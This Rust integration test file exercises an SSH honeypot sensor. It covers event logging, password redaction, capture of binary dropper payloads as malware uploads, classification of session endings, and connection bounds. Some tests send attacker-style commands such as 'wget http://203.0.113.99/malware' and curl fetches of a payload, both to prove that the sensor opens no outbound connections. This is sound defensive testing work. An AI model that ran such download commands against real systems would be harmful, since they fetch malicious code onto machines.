//! Real-client integration tests (Task 14): connects a russh SSH client to this crate's own
//! SSH honeypot and verifies events, protocol correctness, and the no-outbound-connection
//! guarantee end to end. These tests exercise the full stack: TCP, version exchange, key
//! exchange, encrypted transport, user authentication, channel management, and shell/transfer
//! data flow.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use sensor_framework::{ConnectionBounds, WanResolver};

/// Bounds for a test server: production's shape, with a `max_duration` long enough that no test
/// here can be cut off by it. Deliberately not tiny - a too-short duration would make these tests
/// fail intermittently under load for a reason unrelated to what they assert.
fn test_bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(30),
        idle_timeout: Duration::from_secs(60),
        max_duration: Duration::from_secs(120),
        max_captured_bytes: 1_000_000,
        max_concurrent: 64,
    }
}

/// Minimal russh client handler that accepts any host key (this is a test against our own
/// honeypot, not a connection to a third party).
struct TestHandler;

impl russh::client::Handler for TestHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _key: &russh::keys::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

#[tokio::test]
async fn ssh_handshake_and_session_with_real_client() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Connect with russh client.
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();

    // Authenticate.
    let auth_result = session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    assert!(
        auth_result.success(),
        "authentication must succeed (accept-all)"
    );

    // Open a channel and request a shell.
    let channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();

    // Give the server time to send the initial prompt.
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Type commands.
    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel
        .data(&b"wget http://203.0.113.99/malware\n"[..])
        .await
        .unwrap();

    // Give the server time to process and emit events.
    tokio::time::sleep(Duration::from_millis(500)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    // Read and verify events.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event; got: {signal_types:?}"
    );

    // Verify protocol_label = "ssh" on all events.
    for event in &events {
        let label = event
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str());
        assert_eq!(label, Some("ssh"), "protocol_label must be 'ssh'");
    }

    // Verify protocol = "tcp" on all events.
    for event in &events {
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    }

    // Verify authenticated semantics.
    let conn_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION)
        .unwrap();
    assert!(!conn_event.authenticated);
    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert!(login_event.authenticated);

    // PII discipline: password must not appear in any event.
    let all_json = serde_json::to_string(&events).unwrap();
    assert!(
        !all_json.contains("password123"),
        "password must never appear in events"
    );
}

#[tokio::test]
async fn no_outbound_connections() {
    // Start a "target" server that the fake wget/curl would connect to if it actually made
    // network requests. Verify it receives zero connections.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        spool_dir,
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session.authenticate_password("root", "pass").await.unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    let cmd = format!("wget http://127.0.0.1:{}/malware.bin\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();
    let cmd = format!("curl http://127.0.0.1:{}/payload\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();

    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(channel);
    drop(session);
    handle.abort();
    target_task.abort();

    assert_eq!(
        connection_count.load(std::sync::atomic::Ordering::Relaxed),
        0,
        "sensor must open ZERO outbound connections"
    );
}

// ---------------------------------------------------------------------
// Shell-channel evidence capture
//
// SCP/SFTP uploads were already captured through `CaptureHandoff`; the interactive shell
// channel was not, so a Mirai/Gafgyt loader that streams its binary dropper straight into the
// fake shell (rather than using scp/sftp) had that payload suppressed to FakeShell's one-line
// "flood: binary" marker and discarded - never recoverable. These two tests are the mirror of
// sensor-telnet's `capture_is_a_noop_until_start_capture_is_called` family, but end to end
// against a real SSH client/server pair: one proves a binary shell payload is spooled and
// produces a honeypot_malware_upload event, the other proves an ordinary plaintext session
// produces no such capture.
// ---------------------------------------------------------------------

/// Poll `log_path` up to ~1s for an event whose `signal_type` is `honeypot_malware_upload`,
/// returning it if one appears. Bounded polling rather than a fixed sleep: the handoff worker
/// drains its queue off the response path (see `sensor_framework::handoff`'s module doc), so the
/// event can lag the session's close by a small, variable amount.
async fn poll_for_malware_upload(log_path: &std::path::Path) -> Option<sensor_wire::SensorEvent> {
    poll_for_malware_upload_within(log_path, Duration::from_secs(1)).await
}

/// Same, with an explicit deadline: a test that waits for the listener's `max_duration` to cancel
/// a session needs longer than the close-driven case.
async fn poll_for_malware_upload_within(
    log_path: &std::path::Path,
    deadline: Duration,
) -> Option<sensor_wire::SensorEvent> {
    for _ in 0..(deadline.as_millis() / 50).max(1) {
        if let Ok(content) = tokio::fs::read_to_string(log_path).await {
            for line in content.lines() {
                if let Ok(event) = serde_json::from_str::<sensor_wire::SensorEvent>(line)
                    && event.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD
                {
                    return Some(event);
                }
            }
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    None
}

/// The same dropper, cut off mid-line by the listener's `max_duration` instead of finishing.
/// Nothing here raises the per-line flood flag - no line is ever completed - and the session is
/// ended by the listener rather than the client, so this exercises the two production conditions
/// the unit test cannot: detection from the raw bytes, and a capture that must report itself
/// incomplete.
#[tokio::test]
async fn a_payload_cut_off_mid_line_is_still_captured_and_marked_incomplete() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let bounds = ConnectionBounds {
        max_duration: Duration::from_secs(3),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        host_key_path,
        wan_resolver,
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Mostly non-printable, and deliberately unterminated: every byte is high-bit set, so none is
    // CR or LF and the line buffer never reaches MAX_LINE_LEN either. The shell therefore never
    // sees a line, and nothing raises the per-line flood flag.
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    channel.data(&payload[..]).await.unwrap();

    // Hold the session open and let max_duration cancel the handler.
    let event = poll_for_malware_upload_within(&log_path, Duration::from_secs(8))
        .await
        .expect("a cancelled session's binary capture must still be recorded");
    drop(channel);
    drop(session);
    handle.abort();

    assert_eq!(
        event.metadata["capture_reason"], "binary_shell_payload",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], false,
        "a capture handed over by a cancelled handler is a fragment: {:?}",
        event.metadata
    );
    // `Cancelled` is the one ending no code in the handler can record - the listener drops the
    // whole future - so it survives only as the initial value. Asserting `complete` alone would
    // pass for any of the other cut-short reasons too.
    assert_eq!(
        event.metadata["end_reason"], "session_cancelled",
        "{:?}",
        event.metadata
    );
    assert_eq!(event.metadata["size"], payload.len() as u64);
    assert_eq!(event.metadata["wire_size"], payload.len() as u64);
    assert_eq!(event.metadata["truncated"], false);

    let spooled: Vec<_> = std::fs::read_dir(&spool_dir).unwrap().collect();
    assert_eq!(spooled.len(), 1, "the cut-off payload must be spooled");
    let stored = std::fs::read(spooled[0].as_ref().unwrap().path()).unwrap();
    assert_eq!(stored, payload, "the stored bytes are what the client sent");
}

/// How the client ends the session. The sensor has no protocol-defined end of file for a shell
/// capture, so this is the only thing that can say whether the bytes are the whole payload.
enum Ending {
    /// Stop sending and let `idle_timeout` elapse with the session still open.
    GoQuiet,
    /// Send SSH_MSG_DISCONNECT. The peer finished and said so.
    Disconnect,
    /// Drop the TCP connection cleanly, with no DISCONNECT first. The server's next packet read
    /// reports end-of-file, which `classify_read_failure` must read as the peer finishing - the
    /// second ending that has to stay `complete`, and one no production-path test covered.
    CloseSocket,
    /// Abort the TCP connection with an RST (`SO_LINGER` 0). The server's next read fails with a
    /// reset instead of end-of-file, which is a cut-short transfer, not a finished one. These two
    /// endings differ by one socket option and by nothing the handler can otherwise see.
    ResetConnection,
}

/// Drive one unterminated binary payload to `ending` and return the upload event. Every caller
/// sends the same kind of payload, so a difference in the recorded outcome can only come from how
/// the session ended.
async fn payload_session(
    idle_timeout: Duration,
    payload: &[u8],
    ending: Ending,
) -> sensor_wire::SensorEvent {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let bounds = ConnectionBounds {
        idle_timeout,
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        wan_resolver,
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Own the socket rather than letting russh dial, so the two socket-level endings below can
    // choose between a FIN and an RST. `SO_LINGER` has to be set before the connection is handed
    // over, since russh takes the stream by value.
    let socket = tokio::net::TcpStream::connect(addr).await.unwrap();
    if let Ending::ResetConnection = ending {
        // Zero linger makes close send RST rather than FIN, so the server sees a read error
        // instead of end-of-file. Deprecated because a NON-zero linger blocks the closing thread;
        // zero is the opposite case and is exactly what this ending needs.
        #[allow(deprecated)]
        socket.set_linger(Some(Duration::ZERO)).unwrap();
    }
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect_stream(config, socket, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.data(payload).await.unwrap();

    match ending {
        Ending::Disconnect => {
            session
                .disconnect(russh::Disconnect::ByApplication, "", "")
                .await
                .unwrap();
        }
        Ending::CloseSocket | Ending::ResetConnection => {
            // Tear the connection down before waiting for the capture: the ending IS the trigger
            // here, so polling first would just wait out the idle timeout and record that reason
            // instead of the one under test.
            drop(channel);
            drop(session);
        }
        Ending::GoQuiet => {}
    }
    let event = poll_for_malware_upload_within(&log_path, Duration::from_secs(8))
        .await
        .expect("the binary capture must be recorded whatever ended the session");
    handle.abort();
    event
}

/// An SSH session that goes quiet mid-payload is not a finished one: the read fails with a
/// timeout, which used to reach the same "the loop returned" line as a clean disconnect and be
/// labelled complete.
#[tokio::test]
async fn a_payload_abandoned_mid_transfer_is_recorded_as_cut_short_by_the_idle_timeout() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_millis(600), &payload, Ending::GoQuiet).await;

    assert_eq!(
        event.metadata["end_reason"], "idle_timeout",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], false,
        "an idle timeout cut the transfer short: {:?}",
        event.metadata
    );
}

/// The other side of the distinction: the client said it was done. This is the ending that must
/// still read as complete, so the fix above cannot be "label everything incomplete".
#[tokio::test]
async fn a_payload_the_client_finished_sending_before_disconnecting_is_recorded_as_complete() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::Disconnect).await;

    assert_eq!(
        event.metadata["end_reason"], "client_logout",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], true,
        "the client disconnected of its own accord: {:?}",
        event.metadata
    );
}

/// A client that just closes the socket never sends DISCONNECT, so the ending is decided inside
/// `classify_read_failure` rather than by a message the handler can match on. End-of-file means
/// the peer stopped of its own accord, so this has to stay complete - and it is the case an RST is
/// easiest to confuse with, since both simply end the packet loop.
#[tokio::test]
async fn a_payload_whose_client_closes_the_socket_is_recorded_as_peer_closed() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::CloseSocket).await;

    assert_eq!(
        event.metadata["end_reason"], "peer_closed",
        "{:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["complete"], true,
        "the peer closed the connection itself: {:?}",
        event.metadata
    );
}

/// The same teardown one socket option apart: an RST makes the server's read fail rather than
/// report end-of-file, so the transfer was still open. Until this test, no SSH test drove a real
/// read FAILURE through the production path at all - `classify_read_failure` was covered only by
/// unit tests calling it directly, which cannot show it is reached.
#[tokio::test]
async fn a_payload_ended_by_a_connection_reset_is_recorded_as_a_transport_failure() {
    let payload: Vec<u8> = (0u8..200).map(|i| 0x80u8 | (i & 0x3f)).collect();
    let event = payload_session(Duration::from_secs(60), &payload, Ending::ResetConnection).await;

    assert_eq!(
        event.metadata["complete"], false,
        "a reset connection left the transfer open: {:?}",
        event.metadata
    );
    assert_eq!(
        event.metadata["end_reason"], "transport_error",
        "an RST is a socket failure, not the peer finishing: {:?}",
        event.metadata
    );
}

#[tokio::test]
async fn binary_shell_payload_is_captured_as_malware_upload() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir.clone(),
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();

    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    // A line of mostly non-printable bytes (well over the 30% threshold `is_binary_line` uses),
    // terminated by Enter so it commits as one line and reaches `shell.handle_input`. Stands in
    // for a loader streaming a binary dropper straight into the "shell" instead of using scp/sftp.
    let mut payload: Vec<u8> = Vec::new();
    for i in 0u8..200 {
        payload.push(0x80u8.wrapping_add(i));
    }
    payload.push(b'\n');
    channel.data(&payload[..]).await.unwrap();

    tokio::time::sleep(Duration::from_millis(300)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);

    let event = poll_for_malware_upload(&log_path)
        .await
        .expect("a honeypot_malware_upload event must be emitted for a binary shell payload");
    handle.abort();

    assert!(event.authenticated);
    assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    let sample = event
        .sample
        .expect("the malware_upload event must carry a sample");
    assert!(!sample.sha256.is_empty(), "sample.sha256 must be non-empty");
    assert!(sample.size > 0, "sample.size must be non-empty");
    assert_eq!(
        event
            .metadata
            .get("capture_reason")
            .and_then(|v| v.as_str()),
        Some("binary_shell_payload")
    );

    // The sample must actually have landed in the spool directory, not just be named in the
    // event - the spool is the recoverable-evidence artifact this fix exists to produce.
    let spooled: Vec<_> = std::fs::read_dir(&spool_dir)
        .unwrap()
        .filter_map(|e| e.ok())
        .collect();
    assert!(
        !spooled.is_empty(),
        "the binary payload must be written to the quarantine spool directory"
    );

    // PII discipline, mirroring the plaintext test above: the password must never appear
    // anywhere in the emitted events, including this new capture path.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        !content.contains("password123"),
        "password must never appear in events, including malware_upload capture"
    );
}

#[tokio::test]
async fn plaintext_shell_session_produces_no_malware_upload_capture() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();

    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.data(&b"whoami\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);

    // No malware_upload event must ever appear for an all-plaintext interactive session - a
    // fixed wait (not the poll helper, which is built to return early on a hit) so the negative
    // assertion actually gives the handoff worker its full window to prove nothing arrives.
    tokio::time::sleep(Duration::from_millis(500)).await;
    handle.abort();

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();
    assert!(
        !events
            .iter()
            .any(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD),
        "a plaintext-only shell session must never produce a malware_upload capture"
    );
}

// ---------------------------------------------------------------------
// Connection bounds
//
// This sensor hand-rolled its own accept loop and so had none of the framework bounds every
// other sensor gets: no concurrency cap, no session-duration cap, and a bare `continue` on
// accept errors. Nothing in the session path imposes a deadline either - every phase awaits a
// socket read with no timeout - so a peer that connected and then went quiet held its connection,
// and its descriptor, forever. Verified against the live sensor before the fix: a connection left
// idle after KEXINIT was still open 75 seconds later.
//
// Both tests below fail against that old loop, which is the point of them.
// ---------------------------------------------------------------------

/// A silent peer must be disconnected once `max_duration` elapses.
#[tokio::test]
async fn an_idle_session_is_dropped_once_max_duration_elapses() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_duration: Duration::from_secs(1),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // Connect and then say nothing at all - the shape that used to leak a descriptor per peer.
    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();

    // The server greets first, so drain whatever it sends before waiting for the close.
    let mut scratch = [0u8; 1024];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,  // FIN: the session was dropped, as it must be
                Ok(_) => continue,     // banner/KEXINIT; keep waiting
                Err(_) => return true, // reset also counts as disconnected
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "an idle session must be dropped once max_duration elapses, not held indefinitely"
    );
}

/// Beyond `max_concurrent`, further connections are refused immediately rather than queued -
/// an accepted-but-waiting connection is itself the unbounded resource the cap exists to prevent.
#[tokio::test]
async fn concurrency_beyond_max_concurrent_is_refused_not_queued() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_concurrent: 1,
        max_duration: Duration::from_secs(30),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    // First connection takes the only permit and holds it by staying silent.
    let mut first = tokio::net::TcpStream::connect(addr).await.unwrap();
    let mut scratch = [0u8; 1024];
    let _ = tokio::time::timeout(Duration::from_secs(5), first.read(&mut scratch)).await;

    // Second connection: accepted at the TCP layer, then closed without a byte of SSH.
    let mut second = tokio::net::TcpStream::connect(addr).await.unwrap();
    let got = tokio::time::timeout(Duration::from_secs(10), second.read(&mut scratch)).await;

    handle.abort();
    match got {
        Ok(Ok(0)) | Ok(Err(_)) => {}
        Ok(Ok(n)) => panic!("second connection got {n} bytes; the cap did not apply"),
        Err(_) => panic!("second connection was left hanging - queued, not refused"),
    }
}

/// A peer that connects mid-handshake and then goes quiet must be dropped at the READ timeout,
/// not held until `max_duration`.
///
/// `max_duration` is set to 60s here deliberately, far beyond the 15s deadline below: if this
/// passes, the close can only have come from the per-read timeout, so the assertion cannot be
/// satisfied by the session cap that already existed. Before the per-read bound, a peer could hold
/// a connection slot for the full 600s default this way, for the cost of one TCP handshake.
#[tokio::test]
async fn a_peer_that_stalls_mid_handshake_is_dropped_at_the_read_timeout() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        read_timeout: Duration::from_secs(1),
        idle_timeout: Duration::from_secs(1),
        max_duration: Duration::from_secs(60),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();

    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
    // Send a valid client identification so the server proceeds into key exchange, then stop.
    // This is the shape that used to cost nothing to hold: past the accept, never completing.
    use tokio::io::AsyncWriteExt;
    stream
        .write_all(b"SSH-2.0-StalledClient\r\n")
        .await
        .unwrap();

    let mut scratch = [0u8; 4096];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,
                Ok(_) => continue, // banner + KEXINIT; keep waiting for the close
                Err(_) => return true,
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "a stalled handshake must be dropped at the read timeout, well before max_duration"
    );
}
